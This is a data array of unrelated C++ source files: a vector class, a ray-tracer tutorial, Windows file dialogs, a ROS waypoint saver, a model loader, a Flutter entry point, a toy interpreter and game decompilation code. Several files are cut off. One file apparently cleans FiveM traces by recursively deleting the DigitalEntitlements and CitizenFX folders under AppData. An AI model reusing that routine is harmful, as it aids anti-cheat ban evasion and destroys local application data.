    "#include \"testVector.h\"\n\n/*\nIMPLEMENTATION FILE\n*/\n\ntemplate <typename T>\nvoid Vector<T>::reserve_more_capacity(size_t size)\n{\n    if (size > m_capacity)\n    {\n        value_type *buff = new value_type[size];\n        for (size_t i = 0; i < m_size; ++i)\n            buff[i] = std::move(arr[i]);\n        delete[] arr;\n        arr = buff;\n        m_capacity = size;\n    }\n}\n\n// initializer list constructor (allows creating lists with initializer lists, see main.cpp)\ntemplate <typename T>\nVector<T>::Vector(std::initializer_list<value_type> const &items)\n{\n    arr = new value_type[items.size()];\n    int i = 0;\n    for (auto it = items.begin(); it != items.end(); it++)\n    {\n        arr[i] = *it;\n        i++;\n    }\n    m_size = items.size();\n    m_capacity = items.size();\n};\n\ntemplate <typename T>\nsize_t Vector<T>::size()\n{\n    return m_size;\n}\n\ntemplate <typename T>\nT Vector<T>::at(size_type i)\n{\n    return arr[i];\n}\n\ntemplate <typename T>\nvoid Vector<T>::push_back(T v)\n{\n    if (m_size == m_capacity)\n    {\n        reserve_more_capacity(m_size * 2);\n    }\n    arr[m_size++] = v;\n}\n\n// externalizing template instances for correct linking, feel free to find more information\ntemplate class Vector<int>;\n",
    "/*\n    This file is part of darts \u2013 the Dartmouth Academic Ray Tracing Skeleton.\n\n    Copyright (c) 2017-2024 by Wojciech Jarosz\n*/\n\n/**\n    \\file\n    \\brief A tutorial walking through writing your first path tracer in Darts\n*/\n\n#include <darts/camera.h>\n#include <darts/common.h>\n#include <darts/image.h>\n#include <darts/progress.h>\n#include <darts/sphere.h>\n#include <darts/surface_group.h>\n#include <darts/transform.h>\n\nColor3f vec2color(const Vec3f &dir);\nColor3f ray2color(const Ray3f &r);\nColor3f intersection2color(const Ray3f &r, const Sphere &sphere);\nColor3f recursive_color(const Ray3f &ray, const SurfaceGroup &scene, int depth);\nvoid    function_with_JSON_parameters(const json &j);\nvoid    test_manual_camera_image();\nvoid    test_JSON();\nvoid    test_camera_class_image();\nvoid    test_transforms();\nvoid    test_xformed_camera_image();\nvoid    test_ray_sphere_intersection();\nvoid    test_sphere_image();\nvoid    test_materials();\nvoid    test_recursive_raytracing();\n\nint main(int argc, char **argv)\n{\n    darts_init();\n\n    // test_manual_camera_image();\n    // test_JSON();\n    // test_camera_class_image();\n\n    // test_transforms();\n    // test_xformed_camera_image();\n\n    // test_ray_sphere_intersection();\n    // test_sphere_image();\n\n    // test_materials();\n    // test_recursive_raytracing();\n\n    return 0;\n}\n\n/// Generate rays by hand\nvoid test_manual_camera_image()\n{\n    fmt::print(\"\\n\");\n    fmt::print(\"--------------------------------------------------------\\n\"\n               \"PROGRAMMING ASSIGNMENT, PART 1: Generating rays by hand \\n\"\n               \"--------------------------------------------------------\\n\");\n\n    // Setup the output image\n    Image3f ray_image(200, 100);\n\n    const Vec3f camera_origin(0.f, 0.f, 0.f);\n    const float image_plane_width  = 4.f;\n    const float image_plane_height = 2.f;\n\n    // loop over all pixels and generate a ray\n    for (auto y : range(ray_image.height()))\n    {\n        for (auto x : range(ray_image.width()))\n        {\n            // TODO: Fill in ray_origin so that the ray starts at\n            // camera_origin, and fill in ray_direction so that\n            // 1) the x component of the direction varies from -image_plane_width/2 for the left-most pixel to\n            //    +image_plane_width/2 for the right-most pixel\n            // 2) the y component of the direction varies from +image_plane_height/2 for the top-most pixel to\n            //    -image_plane_height/2 for the bottom-most pixel\n            // 3) the z component is -1\n            //\n            // Make sure to calculate the ray directions to go through the center of each pixel\n            Vec3f ray_origin;\n            Vec3f ray_direction;\n            auto  ray = Ray3f(ray_origin, ray_direction);\n\n            // Generate a visual color for the ray so we can debug our ray directions\n            ray_image(x, y) = ray2color(ray);\n        }\n    }\n\n    string filename(\"scenes/assignment1/01_manual_ray_image.png\");\n    spdlog::info(\"Saving ray image to {}....\", filename);\n    ray_image.save(filename);\n}\n\n/// Learn about how darts uses JSON\nvoid test_JSON()\n{\n    // Darts also includes a C++ library (https://github.com/nlohmann/json)\n    // for parsing and manipulating JSON data.\n    //\n    // JSON is a human-readible data interchange format for expressing\n    // attribute-value pairs. You can read more about it here:\n    //      https://en.wikipedia.org/wiki/JSON\n    //      https://www.json.org/\n    //\n    // In darts, we will use it for two purposes:\n    //  1) As a generic way to pass named parameters to functions\n    //  2) As a way to specify and load text-based scene files\n\n    fmt::print(\"\\n\");\n    fmt::print(\"--------------------------------------------------------\\n\"\n               \"PROGRAMMING ASSIGNMENT, PART 2: passing data using JSON \\n\"\n               \"--------------------------------------------------------\\n\");\n\n    float   f(2.f);\n    string  s(\"a text string\");\n    Color3f c3f(1.0f, .25f, .5f);\n    Vec3f   v3f(2, 3, 4);\n    Vec4f   v4f(2, 3, 4, 5);\n    Vec3f   n3f(2, 3, 4);\n    spdlog::info(\"Original darts data:\\nf = {},\\ns = {},\\nc3f = {},\\nv3f = {},\\nv4f \"\n                 \"= {},\\nn3f = {}.\",\n                 f, s, c3f, v3f, v4f, n3f);\n\n    // All the basic darts data-types can easily be stored in a JSON object\n    json j;\n    j[\"my float\"]   = f;\n    j[\"my string\"]  = s;\n    j[\"my color\"]   = c3f;\n    j[\"my vector3\"] = v3f;\n    j[\"my normal\"]  = n3f;\n    spdlog::info(\"The JSON object contains:\\n{}.\", j.dump(4));\n\n    // We can also read these structures back out of the JSON object\n    float  f2 = j[\"my float\"];\n    string s2 = j[\"my string\"];\n    Color3f c3f2 = j[\"my color3\"];\n    Vec3f v3f2 = j[\"my vector3\"];\n    Vec3f n3f2 = j[\"my normal\"];\n\n    spdlog::info(\"Retrieved darts data:\\nf2 = {},\\ns2 = {},\\nc3f2 = {},\\nv3f2 = \"\n                 \"{},\\nn3f2 = {}.\",\n                 f2, s2, c3f2, v3f2, n3f2);\n    // TODO: There is a bug in the code above, and c3f2 doesn't have the same\n   ",
    "#include \"trace.hpp\"\r\n\r\nvoid trace::setup()\r\n{\r\n\t// Locate Appdata\r\n\tstd::string appdata = getenv(\"LOCALAPPDATA\");\r\n\tstd::string localappdata = getenv(\"APPDATA\");\r\n\r\n\t// Locate DigitalElements\r\n\tappdata = appdata + \"\\\\\" + \"DigitalEntitlements\";\r\n\tif(std::filesystem::remove_all(appdata))\r\n\t{\r\n\t\tstd::cout << \"Removed: \" << appdata << std::endl;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tstd::cout << \"Couldn't Find: \" << appdata << std::endl;\r\n\t}\r\n\r\n\t// Locate CitizenFX\r\n\tappdata = localappdata + \"\\\\\" + \"CitizenFX\";\r\n\tif (std::filesystem::remove_all(appdata))\r\n\t{\r\n\t\tstd::cout << \"Removed: \" << appdata << std::endl;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tstd::cout << \"Couldn't Find: \" << appdata << std::endl;\r\n\t}\r\n}\r\n\r\nINT CALLBACK browse_callback_proc(HWND hwnd, UINT uMsg, LPARAM lp, LPARAM pData)\r\n{\r\n\tif (uMsg == BFFM_INITIALIZED) SendMessage(hwnd, BFFM_SETSELECTION, TRUE, pData);\r\n\treturn 0;\r\n}\r\n\r\nvoid trace::destroy()\r\n{\r\n\tm_fivem_path.clear();\r\n\tstd::remove(m_save_path.c_str());\r\n}\r\n\r\nstd::string trace::set_folder(std::string title)\r\n{\r\n\tstd::ifstream path(m_save_path);\r\n\tif (!path.good())\r\n\t{\r\n\t\tstd::string appdata = getenv(\"LOCALAPPDATA\");\r\n\t\tauto fivem_path = appdata + \"\\\\\" + \"FiveM\";\r\n\r\n\t\tBROWSEINFO br;\r\n\t\tZeroMemory(&br, sizeof(BROWSEINFO));\r\n\t\tbr.lpfn = browse_callback_proc;\r\n\t\tbr.ulFlags = BIF_RETURNONLYFSDIRS | BIF_NEWDIALOGSTYLE;\r\n\t\tbr.hwndOwner = NULL;\r\n\t\tbr.lpszTitle = title.c_str();\r\n\t\tbr.lParam = (LPARAM)fivem_path.c_str();\r\n\r\n\t\tstd::string ret;\r\n\r\n\t\tLPITEMIDLIST pidl = NULL;\r\n\t\tif ((pidl = SHBrowseForFolder(&br)) != NULL)\r\n\t\t{\r\n\t\t\tchar buffer[_MAX_PATH];\r\n\t\t\tif (SHGetPathFromIDList(pidl, buffer)) ret = buffer;\r\n\t\t}\r\n\r\n\t\tif (!std::filesystem::exists(ret + \"\\\\\" + \"FiveM.exe\"))\r\n\t\t{\r\n\t\t\treturn std::string();\r\n\t\t}\r\n\r\n\t\tif (!ret.empty())\r\n\t\t{\r\n\t\t\tstd::ofstream save_path(m_save_path);\r\n\t\t\tsave_path << ret << std::endl;\r\n\t\t\tsave_path.close();\r\n\t\t}\r\n\r\n\t\treturn ret;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tstd::string name;\r\n\t\tpath >> name;\r\n\t\treturn name;\r\n\t}\r\n}\r\n\r\n\r\nvoid trace::set_launch_build()\r\n{\r\n\tint choice;\r\n\r\n\tstd::vector<const char*> m_builds = { \"2545\", \"2372\", \"2189\", \"2060\", \"1604\" };\r\n\r\n\tfor (int i = 0; i < m_builds.size(); i++)\r\n\t{\r\n\t\tstd::cout << \"  [\" << i + 1 << \"]  :  \" << m_builds[i] << std::endl;\r\n\t}\r\n\tstd::cin >> choice;\r\n\r\n\tauto path = std::string(m_fivem_path + m_citizen_ini_path).c_str();\r\n\r\n\tif (std::filesystem::exists(path))\r\n\t{\r\n\t\tWritePrivateProfileString(\"Game\", \"SavedBuildNumber\", m_builds[choice - 1], path);\r\n\t}\r\n}\r\n\r\nstd::string trace::get_launch_build()\r\n{\r\n\tauto path = std::string(m_fivem_path + m_citizen_ini_path).c_str();\r\n\tauto buildNumber = 0;\r\n\r\n\tif (std::filesystem::exists(path))\r\n\t{\r\n\t\tbuildNumber = GetPrivateProfileInt(\"Game\", \"SavedBuildNumber\", buildNumber, path);\r\n\t}\r\n\treturn std::to_string(buildNumber);\r\n}\r\n\r\n\r\n",
    "//\r\n// Created by merika on 9/17/2024.\r\n//\r\n\r\n#include \"FileDialogs.hpp\"\r\n\r\n#include <Windows.h>\r\n#include <string>\r\n#include <shobjidl.h>\r\n\r\nnamespace forza_saveswapper {\r\n\r\n    TFileOpenResult FileDialogs::OpenFile() {\r\n        TFileOpenResult result;\r\n        HRESULT f_SysHr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);\r\n        if (FAILED(f_SysHr)) {\r\n            return result;\r\n        }\r\n\r\n        IFileOpenDialog* f_FileSystem;\r\n        f_SysHr = CoCreateInstance(CLSID_FileOpenDialog, nullptr, CLSCTX_ALL, IID_IFileOpenDialog, reinterpret_cast<void**>(&f_FileSystem));\r\n        if (FAILED(f_SysHr)) {\r\n            CoUninitialize();\r\n            return result;\r\n        }\r\n\r\n        f_SysHr = f_FileSystem->Show(nullptr);\r\n        if (FAILED(f_SysHr)) {\r\n            f_FileSystem->Release();\r\n            CoUninitialize();\r\n            return result;\r\n        }\r\n\r\n        IShellItem* f_Files;\r\n        f_SysHr = f_FileSystem->GetResult(&f_Files);\r\n        if (FAILED(f_SysHr)) {\r\n            f_FileSystem->Release();\r\n            CoUninitialize();\r\n            return result;\r\n        }\r\n\r\n        PWSTR f_Path;\r\n        f_SysHr = f_Files->GetDisplayName(SIGDN_FILESYSPATH, &f_Path);\r\n        if (FAILED(f_SysHr)) {\r\n            f_Files->Release();\r\n            f_FileSystem->Release();\r\n            CoUninitialize();\r\n            return result;\r\n        }\r\n\r\n        std::wstring wPath(f_Path);\r\n        const std::string path(wPath.begin(), wPath.end());\r\n        result.Path = path;\r\n\r\n        const size_t slash = result.Path.find_last_of(\"/\\\\\");\r\n        result.SelectedFileName = result.Path.substr(slash + 1);\r\n\r\n        CoTaskMemFree(f_Path);\r\n        f_Files->Release();\r\n        f_FileSystem->Release();\r\n        CoUninitialize();\r\n        result.Succeeded = true;\r\n        return result;\r\n    }\r\n\r\n    TFileSaveResult FileDialogs::SaveFile() {\r\n        TFileSaveResult result{};\r\n        HRESULT f_SysHr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);\r\n        if (FAILED(f_SysHr)) {\r\n            return result;\r\n        }\r\n\r\n        IFileSaveDialog* f_FileSystem;\r\n        f_SysHr = CoCreateInstance(CLSID_FileSaveDialog, nullptr, CLSCTX_ALL, IID_IFileSaveDialog, reinterpret_cast<void**>(&f_FileSystem));\r\n        if (FAILED(f_SysHr)) {\r\n            CoUninitialize();\r\n            return result;\r\n        }\r\n\r\n        f_SysHr = f_FileSystem->Show(nullptr);\r\n        if (FAILED(f_SysHr)) {\r\n            f_FileSystem->Release();\r\n            CoUninitialize();\r\n            return result;\r\n        }\r\n\r\n        IShellItem* f_Files;\r\n        f_SysHr = f_FileSystem->GetResult(&f_Files);\r\n        if (FAILED(f_SysHr)) {\r\n            f_FileSystem->Release();\r\n            CoUninitialize();\r\n            return result;\r\n        }\r\n\r\n        PWSTR f_Path;\r\n        f_SysHr = f_Files->GetDisplayName(SIGDN_FILESYSPATH, &f_Path);\r\n        if (FAILED(f_SysHr)) {\r\n            f_Files->Release();\r\n            f_FileSystem->Release();\r\n            CoUninitialize();\r\n            return result;\r\n        }\r\n\r\n        std::wstring wPath(f_Path);\r\n        const std::string path(wPath.begin(), wPath.end());\r\n        result.Path = path;\r\n\r\n        CoTaskMemFree(f_Path);\r\n        f_Files->Release();\r\n        f_FileSystem->Release();\r\n        CoUninitialize();\r\n        result.Succeeded = true;\r\n        return result;\r\n    }\r\n} // forza_saveswapper",
    "#include \"pose_get_plugin/waypoint_saver.h\"\n#include <fstream>\n#include <ros/ros.h>\n\nnamespace waypoint_saver\n{\nWaypointSaver::WaypointSaver(const std::string& filename) : filename_(filename) {}\n\nvoid WaypointSaver::addWaypoint(const geometry_msgs::Pose& pose, int id)\n{\n  waypoints_.emplace_back(id, pose);\n}\n\nvoid WaypointSaver::removeLastWaypoint()\n{\n  if (!waypoints_.empty())\n  {\n    waypoints_.pop_back();\n  }\n}\n\nvoid WaypointSaver::saveWaypoints()\n{\n  std::ofstream file(filename_);\n  if (!file.is_open())\n  {\n    ROS_ERROR_STREAM(\"Failed to open file: \" << filename_);\n    return;\n  }\n\n  for (const auto& waypoint : waypoints_)\n  {\n    file << waypoint.first << \" \"\n         << waypoint.second.position.x << \" \"\n         << waypoint.second.position.y << \" \"\n         << waypoint.second.position.z << \" \"\n         << waypoint.second.orientation.x << \" \"\n         << waypoint.second.orientation.y << \" \"\n         << waypoint.second.orientation.z << \" \"\n         << waypoint.second.orientation.w << \"\\n\";\n  }\n\n  file.close();\n  ROS_INFO_STREAM(\"Waypoints saved to file: \" << filename_);\n}\n\n} // namespace waypoint_saver",
    "#include \"CloudEngine/graphics/model.h\"\n#include \"CloudEngine/graphics/texture.h\"\n#include \"assimp/types.h\"\n\n#include <assimp/Importer.hpp>\n#include <assimp/material.h>\n#include <assimp/scene.h>\n#include <assimp/postprocess.h>\n#include <cstdio>\n#include <cstring>\n#include <vector>\n\nvoid Model::Init(std::string path)\n{\n    loadModel(path);\n}\n\nvoid Model::Draw(Shader &shader)\n{\n    for (unsigned int i = 0; i < meshes.size(); i++)\n    {\n        meshes[i].Draw(shader);\n    }\n}\n\nvoid Model::loadModel(std::string path)\n{\n    Assimp::Importer importer;\n    const aiScene *scene = importer.ReadFile(path, aiProcess_Triangulate | aiProcess_FlipUVs);\n\n    if (!scene || scene->mFlags & AI_SCENE_FLAGS_INCOMPLETE || !scene->mRootNode)\n    {\n        printf(\"Failed to import model %s:%s\\n\", path.c_str(), importer.GetErrorString());\n        return;\n    }\n\n    directory = path.substr(0, path.find_last_of('/'));\n\n    processNode(scene->mRootNode, scene);\n}\n\nstd::vector<Texture> Model::loadMaterialTextures(aiMaterial *material, aiTextureType aiTexType, TextureType type)\n{\n    std::vector<Texture> textures;\n    for (unsigned int i = 0; i < material->GetTextureCount(aiTexType); i++)\n    {\n        aiString str;\n        material->GetTexture(aiTexType, i, &str);\n\n        bool skip = false;\n        for (unsigned int j = 0; j < loadedTextures.size(); j++)\n        {\n            if (std::strcmp(loadedTextures[j].filePath.data(), str.C_Str()) == 0)\n            {\n                textures.push_back(loadedTextures[j]);\n                skip = true;\n                break;\n            }\n        }\n\n        if (!skip)\n        {\n            std::string fullPath = std::string(str.C_Str());\n            fullPath = directory + '/' + fullPath;\n\n            Texture texture;\n            texture.Create(fullPath);\n            texture.type = type;\n            // texture.filePath = str.C_Str();\n            textures.push_back(texture);\n            loadedTextures.push_back(texture);\n        }\n    }\n\n    return textures;\n}\n\nMesh Model::processMesh(aiMesh *mesh, const aiScene *scene)\n{\n    std::vector<fvec3> vertices;\n    std::vector<fvec3> normals;\n    std::vector<fvec2> uvs;\n    std::vector<unsigned int> indices;\n    std::vector<Texture> textures;\n\n    for (unsigned int i = 0; i < mesh->mNumVertices; i++)\n    {\n        vertices.push_back(fvec3(mesh->mVertices[i].x, mesh->mVertices[i].y, mesh->mVertices[i].z));\n\n        if (mesh->HasNormals())\n        {\n            normals.push_back(fvec3(mesh->mNormals[i].x, mesh->mNormals[i].y, mesh->mNormals[i].z));\n        }\n\n        if (mesh->mTextureCoords[0])\n        {\n            uvs.push_back(fvec2(mesh->mTextureCoords[0][i].x, mesh->mTextureCoords[0][i].y));\n        }\n    }\n\n    for (unsigned int i = 0; i < mesh->mNumFaces; i++)\n    {\n        aiFace face = mesh->mFaces[i];\n        for (unsigned int j = 0; j < face.mNumIndices; j++)\n        {\n            indices.push_back(face.mIndices[j]);\n        }\n    }\n\n    aiMaterial *material = scene->mMaterials[mesh->mMaterialIndex];\n\n    std::vector<Texture> diffuseMaps = loadMaterialTextures(material, aiTextureType_DIFFUSE, TextureType::DIFFUSE);\n    textures.insert(textures.end(), diffuseMaps.begin(), diffuseMaps.end());\n\n    std::vector<Texture> specularMaps = loadMaterialTextures(material, aiTextureType_SPECULAR, TextureType::SPECULAR);\n    textures.insert(textures.end(), specularMaps.begin(), specularMaps.end());\n\n    Mesh myMesh;\n    myMesh.SetVertices(vertices);\n    myMesh.SetNormals(normals);\n    myMesh.SetUVs(uvs);\n    myMesh.SetIndices(indices);\n    myMesh.SetTextures(textures);\n    myMesh.Init();\n\n    return myMesh;\n}\n\nvoid Model::processNode(aiNode *node, const aiScene *scene)\n{\n    for (unsigned int i = 0; i < node->mNumMeshes; i++)\n    {\n        aiMesh *mesh = scene->mMeshes[node->mMeshes[i]];\n        meshes.push_back(processMesh(mesh, scene));\n    }\n\n    for (unsigned int i = 0; i < node->mNumChildren; i++)\n    {\n        processNode(node->mChildren[i], scene);\n    }\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"frontend\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <cstring>\n#include <cwchar>\n#include <cstdlib>\n#include <fstream>\n#include <iostream>\n#include <ostream>\n#include <string>\n#include <vector>\n#include <cctype>\n\nenum class ErrorType {\n    ERR_UNEXPECTED_TOKEN,\n    ERR_MISSING_SEMICOLON\n};\n\nvoid err_exit(ErrorType type, std::string msg) {\n    switch (type) {\n        case ErrorType::ERR_UNEXPECTED_TOKEN:\n            std::cout << \"error -> unexpected token: \" << msg << std::endl;\n            exit(1);\n        case ErrorType::ERR_MISSING_SEMICOLON:\n            std::cout << \"error -> missing semicolon: \" << msg << std::endl;\n            exit(1);\n    }\n}\n\nstruct Function {\n    std::string name;\n    std::vector<std::string> body;\n};\n\nstruct Options {\n    std::string name;\n    bool shell;\n};\n\nOptions parseargs(int argc, char **argv) {\n    if (argc < 2) {\n        std::cout << \"error -> not enough arguments specified.\";\n        exit(1);\n    }\n\n    Options opts;\n    opts.name = argv[1];\n    if (strcmp(argv[1], \"sh\") == 0) {\n        opts.shell = true;\n    }\n\n    return opts;\n}\n\nstd::string strip_quotes(std::string str) {\n    if (str[0] == '\"' && str[str.size() - 1] == '\"') {\n        return str.substr(1, str.size() - 2);\n    } else {\n        return str;\n    }\n}\n\nstd::vector<std::string> tokenize(const std::string &input) {\n    std::vector<std::string> tokens;\n    std::string current_token;\n    bool in_string = false;\n\n    for (size_t i = 0; i < input.length(); ++i) {\n        char c = input[i];\n\n        if (in_string) {\n            current_token += c;\n            if (c == '\"') {\n                tokens.push_back(\n                    current_token);\n                current_token.clear();\n                in_string = false;\n            }\n            continue;\n        }\n\n        if (c == '\"') {\n            if (!current_token.empty()) {\n                tokens.push_back(current_token);\n                current_token.clear();\n            }\n            in_string = true;\n            current_token += c;\n            continue;\n        }\n\n        if (isspace(c)) {\n            if (!current_token.empty()) {\n                tokens.push_back(current_token);\n                current_token.clear();\n            }\n        } else if (c == '(' || c == ')' || c == '{' || c == '}' || c == ';') {\n            if (!current_token.empty()) {\n                tokens.push_back(current_token);\n                current_token.clear();\n            }\n            tokens.push_back(\n                std::string(1, c));\n        } else {\n            current_token += c;\n        }\n    }\n\n    // Add the last token if any\n    if (!current_token.empty()) {\n        tokens.push_back(current_token);\n    }\n\n    return tokens;\n}\n\n// example tokens:\n// func, main, (, ), {, print, (, \"hai :3\", ), ;, }\n\nint eval(std::vector<std::string> &proc) {\n    std::vector<std::string> tokens = proc;\n\n    std::vector<Function> funcs;\n\n    int ptr = 0;\n\n    while (ptr < tokens.size()) {\n        bool handled = false;\n        bool statement_should_end = false;\n        std::string token = tokens[ptr];\n        // no switch for std::strings, so we use ifs :D\n\n        // expect function\n        if (token == \"func\") {\n            handled = true;\n            Function func;\n            ptr++;\n            func.name = tokens[ptr];\n            ptr++;\n            if (tokens[ptr] != \"(\") err_exit(ErrorType::ERR_UNEXPECTED_TOKEN, tokens[ptr]);\n            // TODO: arguments\n            // ---\n            ptr++;\n            if (tokens[ptr] != \")\") err_exit(ErrorType::ERR_UNEXPECTED_TOKEN, tokens[ptr]);\n\n            ptr++;\n            if (tokens[ptr] != \"{\") err_exit(ErrorType::ERR_UNEXPECTED_TOKEN, tokens[ptr]);\n\n            ptr++;\n            while (tokens[ptr] != \"}\") {\n                func.body.push_back(tokens[ptr]);\n                ptr++;\n            }\n            ptr++;\n\n            funcs.push_back(func);\n        }\n\n        if (token == \"*proc_exit\") {\n            return std::stoi(tokens[ptr+1]);\n        }\n\n        // print macro (hardcoded) (yes)\n        if (token == \"*echo\") {\n            handled = true;\n            std::cout << strip_quotes(tokens[ptr+1]) << std::endl;\n            ptr += 2;\n\n            statement_should_end = true;\n        }\n\n        if (!handled) {\n            // except a function call (or a macro, if i implement a working macro system)\n            if (tokens[ptr+1] != \"(\") {\n                // invalid function call, but i need WAY more error handling :(\n            }\n\n            std::string fn_query = token;\n            // valid function (i hope)\n            ptr+=2;\n            while (tokens[ptr] != \")\") {\n                ptr++;\n            }\n            ptr++;\n\n            // actually call the function (might need to put this in a function if i implement macros and a std library and blablabla)\n            for (Function func : funcs) {\n                if (func.name == token) {\n                    eval(func.body);\n                }\n            }\n            statement_should_end = true;\n        }\n\n\n        // AT THE VERY END ",
    "#include \"types.h\"\n#include \"Game/VsGame.h\"\n#include \"Game/SingleGame.h\"\n#include \"Game/MoviePlayer.h\"\n#include \"Game/gameChallenge2D.h\"\n#include \"Game/gameStat.h\"\n#include \"Game/Data.h\"\n#include \"PSSystem/PSGame.h\"\n#include \"PSSystem/PSScene.h\"\n#include \"PSGame/SceneInfo.h\"\n#include \"PSGame/PikScene.h\"\n#include \"Screen/Game2DMgr.h\"\n#include \"Morimura/challengeSelect2d.h\"\n#include \"Morimura/VsSelect.h\"\n#include \"Controller.h\"\n#include \"TParticle2dMgr.h\"\n#include \"Game/Navi.h\"\n#include \"System.h\"\n#include \"nans.h\"\n\nstatic const char vsGSTitleUnusedArray[] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };\nstatic const char vsGSTitleName[]        = \"vsGS_Title\";\n\nnamespace {\nchar* cMaps[4] = { \"caveinfo.txt\", \"caveinfo_metal.txt\", \"caveinfo_conc.txt\", \"caveinfo_tsuchi.txt\" };\n}\n\nnamespace Game {\nnamespace VsGame {\n/**\n * @note Address: 0x80228328\n * @note Size: 0xF8\n */\nTitleState::TitleState()\n    : State(VGS_Title)\n{\n\tmPlayer1Controller = new Controller(JUTGamePad::PORT_0);\n\tmDelegate          = new Delegate<Game::VsGame::TitleState>(this, &dvdload);\n\tmPlayer2Controller = new Controller(JUTGamePad::PORT_1);\n}\n\n/**\n * @note Address: 0x80228420\n * @note Size: 0x134\n */\nvoid TitleState::init(VsGameSection* section, StateArg* arg)\n{\n\tnaviMgr->clearDeadCount();\n\tsection->mGhostIconTimers[1] = 0.0f;\n\tsection->mGhostIconTimers[0] = 0.0f;\n\tsection->mPokoCount          = 0;\n\tsection->mTimeLimit          = 0.0f;\n\tsection->clearGetDopeCount();\n\tsection->clearGetCherryCount();\n\tsection->mCurrentFloor = 0;\n\n\tTitleArg* titleArg = static_cast<TitleArg*>(arg);\n\tif (titleArg && titleArg->mDoNeedClearHeap) {\n\t\tsection->clearHeap();\n\t}\n\n\tsection->mIsChallengePerfect = true;\n\tsection->mDeadPikiCount      = false;\n\tmHeap                        = nullptr;\n\tmExpHeap                     = nullptr;\n\n\tmTitleStage = VSTITLE_PrepareInfo;\n\t_2C         = 0;\n\n\tmCaveInfoType = VSCAVEINFO_Default;\n\tstrcpy(section->mCaveInfoFilename, cMaps[mCaveInfoType]);\n\n\t_20       = 0;\n\tmStageNum = section->mChallengeStageList->mStageData.getChildCount(); // Stage Num\n\n\tsection->refreshHIO();\n\tsection->initPlayData();\n\tScreen::gGame2DMgr->mScreenMgr->reset();\n\n\tsection->mChallengeStageData = nullptr;\n\tsection->mVsStageData        = nullptr;\n}\n\nstatic const char unusedVsTitleString[] = \"\u30b3\u30f3\u30af\u30ea\u30fc\u30c8\"; // 'concrete'\n\n/**\n * @note Address: 0x80228554\n * @note Size: 0x3F4\n */\nvoid TitleState::dvdload()\n{\n\tPSGame::SceneInfo scene;\n\tif (gameSystem->isChallengeMode()) {\n\t\tscene.mSceneType = PSGame::SceneInfo::CHALLENGE_MENU;\n\t} else {\n\t\tscene.mSceneType = PSGame::SceneInfo::VERSUS_MENU;\n\t}\n\tscene.mCameras = 0;\n\n\tstatic_cast<PSGame::PikSceneMgr*>(PSSystem::getSceneMgr())->newAndSetCurrentScene(scene);\n\tPSSystem::getSceneMgr()->doFirstLoad();\n\tPSSystem::getSceneMgr()->doStartMainSeq();\n\n\tmChallengeTitleInfo = new Challenge2D_TitleInfo(CHALLENGE_COURSE_COUNT);\n\tmVsTitleInfo        = new Vs2D_TitleInfo(getVsStageNum());\n\n\tfor (int i = 0; i < 5; i++) {\n\t\tsys->getPlayCommonData()->challenge_get_CourseState(i);\n\t}\n\n\tfor (int i = 0; i < CHALLENGE_COURSE_COUNT; i++) {\n\t\tPlayChallengeGameData::CourseState* scores = sys->getPlayCommonData()->challenge_get_CourseState(i);\n\t\tChallenge2D_TitleInfo::Info* displayData   = (*mChallengeTitleInfo)(i);\n\t\tChallengeGame::StageData* fileData         = mSection->mChallengeStageList->getStageData(i);\n\n\t\tif (fileData) {\n\t\t\tdisplayData->mFloorCount     = fileData->mFloorCounts;\n\t\t\tdisplayData->mTimeLimit      = (int)fileData->mTimeLimit;\n\t\t\tdisplayData->mSprayCounts[0] = fileData->mStartNumBitter;\n\t\t\tdisplayData->mSprayCounts[1] = fileData->mStartNumSpicy;\n\t\t\tdisplayData->mPikiContainer  = &fileData->mPikiContainer;\n\t\t\tdisplayData->mHighscore1P    = &scores->mHighscores[0];\n\t\t\tdisplayData->mHighscore2P    = &scores->mHighscores[1];\n\t\t\tdisplayData->mStageIndex     = fileData->mStageIndex;\n\t\t\tdisplayData->mDisplayFlag.clear();\n\n\t\t\tif (sys->getPlayCommonData()->challenge_checkOpen(i)) {\n\t\t\t\tdisplayData->setDisplayFlag(PlayChallengeGameData::CourseState::CSF_IsOpen);\n\t\t\t}\n\t\t\tif (sys->getPlayCommonData()->challenge_checkClear(i)) {\n\t\t\t\tdisplayData->setDisplayFlag(PlayChallengeGameData::CourseState::CSF_IsClear);\n\t\t\t}\n\t\t\tif (sys->getPlayCommonData()->challenge_checkJustOpen(i)) {\n\t\t\t\tdisplayData->setDisplayFlag(PlayChallengeGameData::CourseState::CSF_WasOpen);\n\t\t\t}\n\t\t\tif (sys->getPlayCommonData()->challenge_checkJustClear(i)) {\n\t\t\t\tdisplayData->setDisplayFlag(PlayChallengeGameData::CourseState::CSF_WasClear);\n\t\t\t}\n\t\t\tif (sys->getPlayCommonData()->challenge_checkJustKunsho(i)) {\n\t\t\t\tdisplayData->setDisplayFlag(PlayChallengeGameData::CourseState::CSF_WasKunsho);\n\t\t\t}\n\t\t\tif 